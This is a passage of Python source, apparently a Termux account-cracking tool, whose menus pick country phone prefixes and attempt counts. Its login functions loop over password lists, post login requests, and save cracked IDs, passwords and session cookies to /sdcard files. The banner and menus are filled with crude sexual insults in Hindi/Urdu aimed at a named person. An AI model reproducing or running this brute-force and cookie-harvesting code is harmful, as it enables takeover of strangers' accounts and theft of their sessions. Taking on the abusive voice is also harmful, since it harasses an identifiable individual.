...
ooo        ooooo  .ooooo.      oooo  .ooooo.   ooooo     ooo 
`88.       .888' 888' `Y88.    `888 888' `Y88. `888'     `8' 
 888b     d'888  888    888     888 888    888  888       8  
 8 Y88. .P  888   `Vbood888     888  `Vbood888  888       8  
 8  `888'   888        888'     888       888'  888       8  
 8    Y     888      .88P'      888     .88P'   `88.    .8'  
o8o        o888o   .oP'     .o. 88P   .oP'        `YbodP'    
                            `Y888P                           
...
\033[1;32m[\033[1;31m✓\033[1;32m] Author     : S9J1D K1 M9 K0 N9NG9 3H0D93 B9L9 
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : S9J1D K1 DD K0 T9DP9 K3 3H0D93 B9L9 
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : S9J1D K1 KH9L9 K1 3HUT 3H0D93 B9L9
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33m FILE +RANDOM S3 H1 3H0D0
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m S9J1D K1 M9 K1 D9RDN9K 3HUD91
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def menu():
        try:
              #  approval()
                        clear()
                        print(f'{G}[{A}1{G}]{G} FILE ME CHODO \n{G}[{A}2{G}]{G} RANDOMLY CHODO\n{G}[{A}3{G}]{G} SAJID KE BAP SE CONTACT KARO\n{G}[{A}0{G}]{G} THAK GYE HO EXIT LO')
                        linex()
                        xd=input(f'{G}[{A}?{G}]{A} CHOICE KARO : ')
                        if xd in ['1','01']:
...
def randm():
    clear()
    print(f'{G}[{A}1{G}]{G} BANGLADESH ME SAJID KI MA  CHODO ')
    
    print(f'{G}[{A}2{G}]{G} INDIA ME SAJID KI BAHAN KO CHODO  ')
    
    print(f'{G}[{A}3{G}]{G} NEPAL LEJAKE SAJID KI KHALA CHODO ')
    
    print(f'{G}[{A}4{G}]{G} PAKISTAN  LEJAKE SAJID KI MA CHODO ')
    
    print(f'{G}[{A}5{G}]{G} AFGHANISTAN LEJAKE SAJID KI MA CHODO ')
    
    print(f'{G}[{A}0{G}]{G} NHI CHODNA TO BACK JAO  ');linex()
    option=input(f'{G}[{A}?{G}]{G} CHOICE KARO KESE CHODOGE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
...
def bd():
		...
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE CHUDAI  HAS COMPLETED')
...
def india():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KIS NUMBER SE CHODOGE : +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KITNI BAR CHODOGE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
...
def nepal():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KIS NUMBER SE CHODOGE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KITNI BAR CHODOGE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		...
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[MAJNU] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[MAJNU] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[MAJNU] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[MAJNU] PRESS ENTER TO BACK ')
		menu()
...
def pakistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KIS NUMBER SE CHODOGE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KITNI BAR CHODOGE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
...
def afghanistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KIS NUMBER SE CHODOGE : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] KITNI BAR CHODOGE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}SAJIDPILLA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}SAJIDPILLA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G} SAJID PILLA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y} SAJID PILA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HATS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}SAJID PILLA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}SAJIDPILLACOOKIE{G}]>{A} "+coki)
...
def rndm2(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}SAJIDPILLA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/HATS-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}SAJIDPILLA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HATS-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
